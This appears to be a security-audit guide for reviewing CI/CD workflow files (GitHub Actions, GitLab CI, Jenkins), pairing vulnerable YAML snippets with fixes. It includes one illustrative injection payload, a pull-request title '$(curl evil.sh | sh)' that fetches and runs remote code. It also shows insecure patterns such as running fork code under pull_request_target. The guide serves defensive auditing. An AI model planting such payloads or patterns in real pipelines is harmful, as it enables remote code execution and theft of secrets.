# Lens: CI/CD Workflow Security

The pipeline config lives in the repo (`.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`) and runs with credentials that can read every secret and deploy production. No Rails engine looks at it, yet one misconfigured workflow is repo-wide remote code execution or a secret exfiltrated from a fork's pull request. Read the workflow files.

This lens covers the repo's CI pipeline — a distinct layer from the Rails app code. Specialist tools exist (`zizmor`, `actionlint`, `octoscan`); this is the high-impact set an audit shouldn't miss. Skip if the repo has no CI config. Most findings here are OWASP 2025 A08 (software & data integrity).

## `pull_request_target` running untrusted code

`pull_request_target` runs in the context of the **base** repo — with its secrets and a write-scoped `GITHUB_TOKEN` — but a fork can open a PR. If the workflow then checks out the PR's head (the fork's code) and *runs* it (build, install, test, a script), an attacker's PR executes arbitrary code with your secrets and token: repo-wide RCE and secret exfiltration. The trigger exists for labelling/commenting on PRs, not for running their code.

```yaml
# Problem — runs fork-controlled code with the base repo's secrets
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with: { ref: ${{ github.event.pull_request.head.sha }} }   # fork code
      - run: bundle install && bin/rspec                            # ...executed with secrets
# Fix — untrusted PR code runs under `pull_request` (no secrets); reserve pull_request_target
# for steps that never check out or execute the PR's code.
on: pull_request
```

## Untrusted input interpolated into a `run:` shell

`${{ ... }}` is substituted into the script *before* the shell runs, so an expression an attacker controls — a PR title, branch name, issue body, commit message — is shell injection in the runner (`title: "$(curl evil.sh | sh)"`). Pass untrusted values through `env:` and reference them as shell variables instead.

```yaml
# Problem — the PR title is spliced into the shell → arbitrary command execution
- run: echo "Building ${{ github.event.pull_request.title }}"
# Fix — pass it as an env var; the shell treats it as data, not code
- run: echo "Building $TITLE"
  env: { TITLE: ${{ github.event.pull_request.title }} }
```

## Unpinned third-party actions

`uses: some-org/action@v4` (or `@main`) resolves to a moving tag — whoever controls that tag runs code in your pipeline with its secrets. A compromised or hijacked action is a supply-chain breach (the CI twin of the importmap-CDN pin in `arsenal/cve.md`). Pin third-party actions to a full commit SHA.

```yaml
- uses: some-org/deploy-action@v4                                    # Problem — moving tag, no integrity
- uses: some-org/deploy-action@a1b2c3d4e5f6...  # v4.2.0             # Fix — pinned to a reviewed SHA
```

First-party `actions/*` and `ruby/setup-ruby` are lower-risk; pinning them too is best practice but rank it below third-party.

## Long-lived cloud credentials as CI secrets

A stored `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` (or GCP service-account JSON) is long-lived, broadly scoped, and exfiltrated whole if any step is compromised. Use OIDC: the workflow mints a short-lived, role-scoped token at run time, with no key stored anywhere.

```yaml
# Problem — long-lived keys live in repo secrets forever
- uses: aws-actions/configure-aws-credentials@SHA
  with: { aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}, aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }} }
# Fix — OIDC: assume a role, no stored keys (needs `permissions: id-token: write`)
- uses: aws-actions/configure-aws-credentials@SHA
  with: { role-to-assume: arn:aws:iam::123:role/ci-deploy, aws-region: us-east-1 }
```

## Over-broad workflow permissions

The `GITHUB_TOKEN` defaults to a broad scope on many repos. A workflow (or a compromised step within it) with `contents: write` / `packages: write` / `id-token: write` it doesn't need can push code, publish packages, or assume cloud roles. Set a read-only default and grant the minimum per job.

```yaml
permissions: write-all          # Problem — every job gets a write-scoped token
permissions: { contents: read } # Fix — default closed; add the one scope a job needs (e.g. id-token: write on deploy)
```

## Other platforms

The same classes apply with different syntax:
- **GitLab CI** — protected variables (secrets) must not be exposed to unprotected branches/MRs; gate jobs that hold secrets with `rules:`/`only:` on protected refs. Pin `include:` remote templates to a ref/SHA.
- **Jenkins** — unsandboxed Groovy / disabled script-security is arbitrary execution on the controller; credentials bound into shell steps leak via `set -x` and build logs.

## Severity and remedies

- **`pull_request_target` running fork code and untrusted `${{ }}` in a `run:` shell are confirmed-critical** — repo-wide RCE and exfiltration of every CI secret (including production deploy credentials). State the trigger and the secret reachable.
- **Unpinned third-party actions and long-lived cloud keys** are supply-chain / credential-hygiene findings — rank with the dependency tier (pairs with the importmap-CDN finding in `arsenal/cve.md`).
- **Over-broad `permissions`** is the hardening tier.

Remedies: run untrusted PR code only under `pull_request` (no secrets); pass untrusted inputs via `env:`, never inline `${{ }}` in a script; pin third-party actions to a SHA; replace stored cloud keys with OIDC role assumption; set `permissions: contents: read` and grant the minimum per job. Branch protection (required review + green CI on `main`) is the backstop, but it does not contain a malicious workflow that already runs with secrets.
